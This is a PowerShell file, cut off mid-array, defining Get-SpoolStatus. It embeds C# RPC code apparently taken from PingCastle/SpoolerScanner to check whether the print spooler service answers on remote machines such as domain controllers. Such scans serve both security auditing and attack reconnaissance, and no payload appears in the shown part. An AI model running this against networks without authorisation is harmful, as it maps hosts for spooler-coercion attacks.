
<#
    Author: Cube0x0
    License: BSD 3-Clause
#>
Function Get-SpoolStatus {
    <#
    https://github.com/vletoux/SpoolerScanner
    
	.OUTPUT
	PS > Get-SpoolStatus -ComputerName localhost
	ComputerName Status
	------------ ------
	localhost     False
	dc            True
	#>
	Param(
        [parameter(Mandatory=$true,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
        [string[]]$ComputerName
	)
	$sourceSpooler = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;

namespace PingCastle.ExtractedCode
{
	public class rprn
	{
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW",
            CallingConvention = CallingConvention.StdCall,
            CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
            
            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);
            
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcBindingFree(ref IntPtr lpString);
            
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcStringBindingCompose(
                String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options,
                out IntPtr lpBindingString
                );
                
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
            private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

		[DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
		   CharSet = CharSet.Unicode, SetLastError = false)]
		internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, ref IntPtr Handle);
        
        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
			CharSet = CharSet.Unicode, SetLastError = false)]
		private static extern IntPtr NdrClientCall2x64(IntPtr intPtr1, IntPtr intPtr2, string pPrinterName, out IntPtr pHandle, string pDatatype, ref rprn.DEVMODE_CONTAINER pDevModeContainer, int AccessRequired);

		[DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
			CharSet = CharSet.Unicode, SetLastError = false)]
		private static extern IntPtr NdrClientCall2x64(IntPtr intPtr1, IntPtr intPtr2, IntPtr hPrinter, uint fdwFlags, uint fdwOptions, string pszLocalMachine, uint dwPrinterLocal, IntPtr intPtr3);

		private static byte[] MIDL_ProcFormatStringx86 = new byte[] {
				0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x01,0x00,0x18,0x00,0x31,0x04,0x00,0x00,0x00,0x5c,0x08,0x00,0x40,0x00,0x46,0x06,0x08,0x05,
				0x00,0x00,0x01,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0x02,0x00,0x10,0x01,0x04,0x00,0x0a,0x00,0x0b,0x00,0x08,0x00,0x02,0x00,0x0b,0x01,0x0c,0x00,0x1e,
				0x00,0x48,0x00,0x10,0x00,0x08,0x00,0x70,0x00,0x14,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
				0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x03,0x00,0x08,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
				0x04,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,
				0x48,0x00,0x00,0x00,0x00,0x05,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,
				0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x06,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,
				0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x07,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,
				0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x08,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,
				0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x09,0x00,0x08,0x00,
				0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,
				0x00,0x0a,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,
				0x00,0x48,0x00,0x00,0x00,0x00,0x0b,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0c,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0d,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,
				0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0e,0x00,0x08,0x00,0x32,0x00,0x00,0x00,
				0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0f,0x00,0x08,
				0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x10,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x11,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x12,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x13,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,
				0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x14,0x00,0x08,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x15,0x00,
				0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,
				0x00,0x00,0x00,0x16,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x17,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x18,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x19,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,
				0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1a,0x00,0x08,0x00,0x32,0x00,
				0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1b,
				0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,
				0x00,0x00,0x00,0x00,0x1c,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,
				0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1d,0x00,0x08,0x00,0x30,0xe0,0x00,0x00,0x00,0x00,0x38,0x00,0x40,0x00,0x44,0x02,0x08,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x18,0x01,0x00,0x00,0x36,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1e,0x00,0x08,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1f,0x00,
				0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,
				0x00,0x00,0x00,0x20,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x21,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x22,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x23,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,
				0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x24,0x00,0x08,0x00,0x32,0x00,
				0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x25,
				0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x26,0x00,
				0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x27,0x00,0x08,
				0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x28,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x29,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2a,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2b,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2c,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,
				0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2d,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
				0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2e,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,
				0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2f,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
				0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x30,0x00,0x08,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
				0x31,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x32,
				0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x33,0x00,
				0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,
				0x00,0x00,0x00,0x34,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x35,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x36,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x37,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x38,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x39,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,
				0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3a,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,
				0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3b,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,
				0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3c,0x00,0x08,0x00,
				0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,
				0x00,0x3d,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,
				0x00,0x48,0x00,0x00,0x00,0x00,0x3e,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3f,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x40,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x41,0x00,0x1c,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x3c,0x00,0x08,0x00,0x46,0x07,0x08,0x05,0x00,0x00,
				0x01,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x3a,0x00,0x48,0x00,0x04,0x00,0x08,0x00,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x00,0x0c,0x00,0x02,0x00,0x48,
				0x00,0x10,0x00,0x08,0x00,0x0b,0x00,0x14,0x00,0x3e,0x00,0x70,0x00,0x18,0x00,0x08,0x00,0x00
            };

		private static byte[] MIDL_ProcFormatStringx64 = new byte[] {
				0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x01,0x00,0x30,0x00,0x31,0x08,0x00,0x00,0x00,0x5c,0x08,0x00,0x40,0x00,0x46,0x06,
				0x0a,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0x02,0x00,0x10,0x01,0x08,0x00,0x0a,0x00,0x0b,0x00,0x10,0x00,0x02,0x00,0x0b,
				0x01,0x18,0x00,0x1e,0x00,0x48,0x00,0x20,0x00,0x08,0x00,0x70,0x00,0x28,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x02,0x00,0x10,0x00,0x32,0x00,
				0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,
				0x00,0x03,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x04,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x05,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,
				0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x06,0x00,0x10,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
				0x07,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x08,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x09,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,
				0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0a,0x00,0x10,0x00,0x32,0x00,0x00,0x00,
				0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0b,
				0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,
				0x00,0x48,0x00,0x00,0x00,0x00,0x0c,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0d,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0e,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,
				0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0f,0x00,
				0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,
				0x48,0x00,0x00,0x00,0x00,0x10,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x11,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x12,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
				0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x13,0x00,0x10,
				0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,
				0x00,0x00,0x00,0x00,0x14,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x15,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x16,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,
				0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x17,0x00,0x10,0x00,
				0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,
				0x00,0x00,0x00,0x18,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,
				0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x19,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1a,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,
				0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1b,0x00,0x10,0x00,0x32,
